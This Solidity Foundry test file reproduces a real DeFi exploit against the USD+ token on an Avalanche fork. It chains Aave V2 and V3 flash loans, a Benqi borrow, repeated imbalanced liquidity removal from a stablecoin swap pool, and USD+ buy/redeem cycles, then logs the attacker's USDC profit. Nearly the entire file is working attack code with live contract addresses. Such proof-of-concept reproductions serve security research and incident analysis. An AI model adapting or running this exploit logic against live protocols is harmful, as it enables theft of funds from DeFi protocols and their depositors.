// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/peckshield/status/1598704809690877952
// @Address
// https://snowtrace.io/address/0xfe2c4cb637830b3f1cdc626b99f31b1ff4842e2c

interface JoeRouter {
    function swapAVAXForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

interface USDPlus {
    function buy(address _referredBy, uint256 amount) external returns (uint256);
    function redeem(address to, uint256 amount) external returns (uint256 redeemed);
}

interface SwapFlashLoan {
    function calculateTokenAmount(uint256[] calldata amounts, bool deposit) external view returns (uint256);

    function addLiquidity(uint256[] calldata amounts, uint256 minToMint, uint256 deadline) external returns (uint256);

    function calculateRemoveLiquidity(uint256 amount) external returns (uint256[] memory);

    function removeLiquidityImbalance(
        uint256[] calldata amounts,
        uint256 maxBurnAmount,
        uint256 deadline
    ) external returns (uint256);

    function swap(
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx,
        uint256 minDy,
        uint256 deadline
    ) external returns (uint256);
}

interface BenqiFinance {
    function enterMarkets(address[] memory qiTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
    function getHypotheticalAccountLiquidity(
        address account,
        address qiTokenModify,
        uint256 redeemTokens,
        uint256 borrowAmount
    ) external view returns (uint256, uint256, uint256);
}

interface BenqiChainlinkOracle {
    function getUnderlyingPrice(address qiToken) external view returns (uint256);
}

interface QiUSDCn {
    function mint(uint256 mintAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface QiUSDC {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow(uint256 repayAmount) external returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
}

interface PlatypusFinance {
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external;
}

interface NetAsset {
    function netAssetValue() external view returns (uint256);
}

interface TotalNetAsset {
    function totalNetAssets() external view returns (uint256);
}

interface SicleRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ContractTest is Test {
    JoeRouter Router = JoeRouter(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
    SicleRouter sicleRouter = SicleRouter(0xC7f372c62238f6a5b79136A9e5D16A2FD7A3f0F5);
    USDPlus USDplus = USDPlus(0x73cb180bf0521828d8849bc8CF2B920918e23032);
    SwapFlashLoan Swap = SwapFlashLoan(0xED2a7edd7413021d440b09D654f3b87712abAB66);
    IAaveFlashloan LendingPoolV2 = IAaveFlashloan(0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C);
    IAaveFlashloan PoolV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    BenqiFinance Benqi = BenqiFinance(0x486Af39519B4Dc9a7fCcd318217352830E8AD9b4);
    BenqiChainlinkOracle Oracle = BenqiChainlinkOracle(0x316aE55EC59e0bEb2121C0e41d4BDef8bF66b32B);
    QiUSDCn qiUSDCn = QiUSDCn(0xB715808a78F6041E46d61Cb123C9B4A27056AE9C);
    PlatypusFinance Platypus = PlatypusFinance(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
    QiUSDC qiUSDC = QiUSDC(0xBEb5d47A3f720Ec0a390d04b4d41ED7d9688bC7F);
    NetAsset netAsset = NetAsset(0xc2c84ca763572c6aF596B703Df9232b4313AD4e3);
    TotalNetAsset totalNetAsset = TotalNetAsset(0x9Af655c4DBe940962F776b685d6700F538B90fcf);
    IERC20 USDPLUS = IERC20(0xe80772Eaf6e2E18B651F160Bc9158b2A5caFCA65);
    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 nUSD = IERC20(0xCFc37A6AB183dd4aED08C204D1c2773c0b1BDf46);
    IERC20 DAI_e = IERC20(0xd586E7F844cEa2F87f50152665BCbc2C279D8d70);
    IERC20 USDT_e = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    IERC20 USDC_e = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 nUSDLP = IERC20(0xCA87BF3ec55372D9540437d7a86a7750B42C02f4);
    address avUSDC = 0x46A51127C3ce23fb7AB1DE06226147F446e4a857;
    uint256 PoolV2BorrowAmount;
    uint256 amountBuy;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("Avalanche", 23_097_846);
    }

    function testExploit() public payable {
        amountBuy = 36_000_000_000;
        address[] memory path = new address[](2);
        path[0] = address(WAVAX);
        path[1] = address(USDC);
        Router.swapAVAXForExactTokens{value: 2830 ether}(amountBuy, path, address(this), block.timestamp);

        uint256 beforeAttackBalance = USDC.balanceOf(address(this));
        emit log_named_uint("Before exploit , USDC balance of attacker", beforeAttackBalance / 1e6);

        Hack();

        uint256 afterAttackBalance = USDC.balanceOf(address(this));
        emit log_named_uint("After exploit , USDC balance of attacker", afterAttackBalance / 1e6);

        uint256 profitAttack = afterAttackBalance - beforeAttackBalance;
        emit log_named_uint("Profit: USDC balance of attacker", profitAttack / 1e6);
    }

    function Hack() public {
        for (uint256 i = 0; i < 6; i++) {
            cheats.roll(block.number + 1);
            PoolV2BorrowAmount = USDC_e.balanceOf(avUSDC);
            address[] memory assets = new address[](1);
            assets[0] = address(USDC_e);
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = PoolV2BorrowAmount;
            uint256[] memory modes = new uint[](1);
            modes[0] = 0;
            LendingPoolV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0); // FlashLoan USDC.e
            cheats.roll(block.number + 1); // USD+ buy and redeem not allowed in one block
            // redeem USD+ to USDC
            if ((totalNetAsset.totalNetAssets() - netAsset.netAssetValue()) > USDPLUS.balanceOf(address(this))) {
                USDplus.redeem(address(USDC), USDPLUS.balanceOf(address(this)));
            } else {
                USDplus.redeem(address(USDC), totalNetAsset.totalNetAssets() - netAsset.netAssetValue());
            }
        }
        USDPLUS.approve(address(sicleRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDPLUS);
        path[1] = address(USDC);
        sicleRouter.swapExactTokensForTokens(USDPLUS.balanceOf(address(this)), 0, path, address(this), block.timestamp);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        if (msg.sender == address(LendingPoolV2)) {
            USDC_e.approve(address(LendingPoolV2), type(uint256).max);
            address[] memory assets1 = new address[](1);
            assets1[0] = address(USDC);
            uint256[] memory amounts1 = new uint256[](1);
            amounts1[0] = PoolV2BorrowAmount / 2;
            uint256[] memory modes = new uint[](1);
            modes[0] = 0;
            PoolV3.flashLoan(address(this), assets1, amounts1, modes, address(this), "", 0); // FlashLoan USDC

            return true;
        } else {
            USDC.approve(address(PoolV3), type(uint256).max);
            uint256 mintAmount = PoolV2BorrowAmount / 2;
            USDC.approve(address(qiUSDCn), type(uint256).max);
            qiUSDCn.mint(mintAmount); // deposit USDC to qiUSDCn

            address[] memory qiTokens = new address[](1);
            qiTokens[0] = address(qiUSDCn);
            Benqi.enterMarkets(qiTokens);
            (, uint256 accountLiquidity,) = Benqi.getAccountLiquidity(address(this));
            uint256 oraclePrice = Oracle.getUnderlyingPrice(address(qiUSDC)) / 1e18;
            uint256 borrowAmount = accountLiquidity / oraclePrice;
            qiUSDC.borrow(borrowAmount); // borrow USDC.e from qiUSDC

            // swap USDC.e to nUSD, DAI.e, USDT.e
            USDC_e.approve(address(Swap), type(uint256).max);
            nUSDLP.approve(address(Swap), type(uint256).max);
            uint256[] memory amount = new uint256[](4);
            amount[2] = USDC_e.balanceOf(address(this));
            uint256 minToMint = Swap.calculateTokenAmount(amount, true) * 99 / 100;
            uint256 LPAmount = Swap.addLiquidity(amount, minToMint, block.timestamp);
            uint256 i = 0;
            while (i < 9) {
                uint256[] memory removeAmount = new uint256[](4);
                removeAmount = Swap.calculateRemoveLiquidity(LPAmount);
                removeAmount[2] = 0;
                Swap.removeLiquidityImbalance(removeAmount, LPAmount, block.timestamp);
                LPAmount = nUSDLP.balanceOf(address(this));
                i++;
            }
            uint256[] memory removeAmount1 = new uint256[](4);
            removeAmount1 = Swap.calculateRemoveLiquidity(LPAmount);
            Swap.removeLiquidityImbalance(removeAmount1, LPAmount, block.timestamp);
            uint256 swapAmount = USDC_e.balanceOf(address(this)) / 3;
            nUSD.approve(address(Swap), type(uint256).max);
            DAI_e.approve(address(Swap), type(uint256).max);
            USDT_e.approve(address(Swap), type(uint256).max);
            // swap remaining USDC.e to nUSD, DAI.e, USDT.e
            Swap.swap(2, 0, swapAmount, 0, block.timestamp);
            Swap.swap(2, 1, swapAmount, 0, block.timestamp);
            Swap.swap(2, 3, swapAmount, 0, block.timestamp);

            USDC.approve(address(USDplus), type(uint256).max);
            USDplus.buy(address(USDC), USDC.balanceOf(address(this))); // tigger Swap.addLiquidity(USDC.e), add USDC.e reserve in Pool
            // swap nUSD, DAI.e, USDT.e to USDC.e
            Swap.swap(0, 2, nUSD.balanceOf(address(this)), 0, block.timestamp);
            Swap.swap(1, 2, DAI_e.balanceOf(address(this)), 0, block.timestamp);
            Swap.swap(3, 2, USDT_e.balanceOf(address(this)), 0, block.timestamp);

            USDC_e.approve(address(qiUSDC), qiUSDC.borrowBalanceStored(address(this)));
            qiUSDC.repayBorrow(qiUSDC.borrowBalanceStored(address(this))); // repay borrow USDC.e
            qiUSDCn.redeemUnderlying(mintAmount); // withdraw USDC from qiUSDCn

            USDC_e.approve(address(Platypus), type(uint256).max);
            uint256 USDC_eSwapAmount = USDC_e.balanceOf(address(this)) - PoolV2BorrowAmount / 9991 * 10_000 + 1000;
            Platypus.swap(
                address(USDC_e),
                address(USDC),
                USDC_eSwapAmount,
                USDC_eSwapAmount * 99 / 100,
                address(this),
                block.timestamp
            ); // swap profit USDC.e to USDC

            return true;
        }
    }

    receive() external payable {}
}
